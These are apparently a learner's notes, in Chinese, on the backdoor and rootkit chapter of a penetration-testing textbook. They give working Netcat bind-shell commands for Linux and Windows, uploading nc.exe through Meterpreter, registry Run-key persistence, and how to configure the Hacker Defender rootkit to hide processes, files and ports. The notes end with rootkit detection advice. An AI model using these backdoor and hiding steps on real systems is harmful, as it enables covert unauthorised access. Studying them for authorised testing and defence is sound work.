《渗透测试实践指南：必知必会的工具与方法》  入门者笔记

  

第6章 使用后门和rootkit维持访问

  

只有载荷处于运行状态，才能攻击并提供访问权限；一旦重启或进程中止，shell不复存在；

重要之处：理解文件传送方向性；构建后门需要在目标计算机上将Netcat配置成监听模式

  

  

Netcat：用于计算机间传递文件 / 端口扫描 / 即时聊天 / 搭建简单Web服务器

1996年发布最初版本，由Hobbit编写，用于收发TCP/UDP流量；

作为客户端，可以使用本地计算机的任意端口连接远程目标计算机的任意端口；

服务器模式用于监听，接收连接

  
  

1.将Netcat配置为连接两台计算机的通信通道

选择一个端口并将Netcat运行于监听模式，终端执行nc -l -p 2323

命令nc调用Netcat；参数“\-l”置为监听模式，“\-p”为监听端口号

在另一计算机终端执行nc 172.16.45.132 2323迫使连接上述计算机；CTRL C结束连接；

一旦关闭Netcat连接，想建立新连接就需要重新启动；

但在Window版本中，以监听模式启动Netcat时使用参数“\-L”；

可在客户端断开之后，仍然与目标计算机端口保持连接状态；添加Netcat至注册表

HKEY\_LOCAL\_MACHINE\\software\\microsoft\\windows\\currentversion\\run\*

  
  

2.计划从本地上传新文件到监听机监听机Netcat已运行，

执行命令nc -l -p 7777 > calc.exe，等待连接；

任何接收的输入信息被存储到文件“calc.exe”之中；

在本地计算机上与监听机连接，终端执行nc 172.16.45.129 7777 < calc.exe；

Netcat不提供反馈，可在监听机输入“ls”命令查看；

也可以通过配置Netcat连接，以\><相反顺序执行上述命令，从监听机下载文件

  

  

3.在渗透测试过程中，有一些开放端口没有提供说明信息；

或Nmap/Nessus无法识别端口服务；解决办法是

使用Netcat建立到目标端口的盲连接，通过键盘输入可能会引发目标端口响应：

如扫描过程发现端口50001开放，但无法判断运行服务；

终端执行 nc 127.16.45.129 50001；试图建立目标端口/服务TCP连接，

可用“\-u”参数强制Netcat发送UDP；之后输入进行试探

  

  

4.将Netcat绑定在进程上使其可被远程连接；

当执行绑定程序并与之交互时，远程控制；

如果使用“\-e”参数启动Netcat，将执行在“\-e”参数之后指定的任何程序，

该程序在目标计算机上执行，并且只会在连接建立之后执行；

配置后门，将可执行命令shell绑定到目标计算机端口；

如果本地是linux系统，终端执行nc -l -p 12345 -e /bin/sh命令，

使目标计算机为任何一个连接到端口12345的程序提供一个shell服务；

此外，任何来自Netcat客户端的命令到达目标计算机之后都将被当作本地命令执行；

也可以用在windows系统上，在目标计算机终端窗口执行命令

nc.exe -L -p 12345 C:\\Windows\\System32\\cmd.exe

  
  

5.利用Netcat实现后门，首先将Netcat上传目标计算机，

假设正在使用Meterpreter的shell与目标计算机进行交互，

终端执行meterpreter > upload nc.exe C:\\Windows\\System32；

注意！需要上传与目标计算机系统匹配版本Netcat；

进而选择端口号，绑定cmd.exe程序，以服务器模式开启Netcat，

终端执行meterpreter > nc -L -p 5777 -e cmd.exe；再修改注册表

HKEY\_LOCAL\_MACHINE\\software\\microsoft\\windows\\currentversion\\run

重启后自启动

  
  

Cryptcat：使用twofish对客户端/服务器端流量加密的Netcat

默认key值为metallica，“\-k”参数可修改；cryptcat -l -p 5757，cryptcat 172.16.45.129 5757

  

  

Netbus：经典远程控制软件

发布于1998年，最初由Carl Fredrik编写；软件分两部分，服务器端安装在目标计算机上

解压缩后安装服务器端软件，需要在目标计算机上执行patch.exe文件，安装并启动Netbus；

安装以后程序将以名为patch.exe的进程运行，并自动在注册表创建注册项，随系统自启动；

访问客户端面板，需要运行Netbus.exe；之后在Host name/IP字段中输入IP，单击Connect

  

  

Rootkit：由root和kit派生；可以隐藏文件、进程、程序甚至是操作系统本身

其中比较著名的Hacker Defender，主要包括三个主要文件：

可执行文件hxdef100.exe，在目标计算机上运行；

配置文件hxdef100.ini，进行选项设置或列出想要隐藏的内容；

客户端软件bdcli100.exe用于连接后门

  

  

上传hsdef100.zip文件到目标计算机上之后，在目标驱动盘根目录下创建单独文件夹解压；

打开.ini文件，每一section（节）都以方括号括起来的名称开头，默认项不需修改；支持\*

  

\[Hidden Table\]  隐藏列举的所有文件/目录/文件夹

\[Hidden Processes\]  隐藏列举的所有进程

\[Root Processes\]  允许程序交互以及查看此前已经的隐藏文件夹和进程，

 包括列举在\[Hidden Table\]\[Hidden Porcesses\]中的程序

\[Hidden Services\]  隐藏以服务方式安装或运行的程序

\[Hidden Regkeys\]  隐藏特定注册表键

\[Hidden RegValues\]  隐藏注册表键的值

\[Startup Run\]  列举在HD启动之后自动运行的程序，

适合放置Netcat命令，前提是确保运行在监听模式

\[Free Space\]强制计算机隐藏已经使用的磁盘空间，该数字以字节为单位

\[Hidden Ports\]  子节“TCPI：”/“TCPO：”隐藏入/出流量TCP端口，

  “，”分割；“UDP：”隐藏UDP端口

  

Rootkit的检测与防御

1.降低用户权限：可以使用su / Run As命令临时提升用户权限

2.发现隐藏文件/rootkit的工具：Rootkit Revealer，vice，Blacklight等

3.安装、使用、维持最新版软件；监控所在网络的进出流量；定期对系统进行端口扫描

4.硬盘挂接到另一个系统上再扫描，不会调用已被感染的操作系统API；完全格式化

  

资料与实践

Windows版Netcat可以连接Linux版Netcat，反之亦然；但在参数和程序功能上细节不同

Kootkit进阶：系统钩子、函数调用；理解用户模式和内核模式工具包的区别；系统编程

Ncat：现代版Netcat，是Nmap项目的组成部分，提供SSL和IPV6支持

Socat：侧重于读写网络流量方面，Netcat的拓展，增加SSL、IPV6支持和高级特性

Back Orifice：类似Netcat使用命令行操控远程计算机，1998年由Dystic编写最初发行版

SubSeven（Sub7）：首版由Mobman在1999年发布，采用客户端/服务器模式；远程控制
